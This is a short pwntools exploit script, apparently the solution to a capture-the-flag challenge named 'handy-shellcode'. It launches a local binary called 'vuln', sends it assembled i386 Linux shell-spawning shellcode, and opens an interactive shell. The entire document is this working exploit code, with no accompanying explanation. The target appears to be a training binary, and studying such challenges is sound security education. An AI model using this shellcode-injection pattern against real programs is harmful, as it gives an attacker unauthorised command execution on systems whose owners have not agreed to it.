from pwn import *

# save script in home directory ~
# run script from in the handy-shellcode directory

sh = process('vuln')
sh.sendlineafter(':\n', asm(shellcraft.i386.linux.sh()))
sh.interactive()
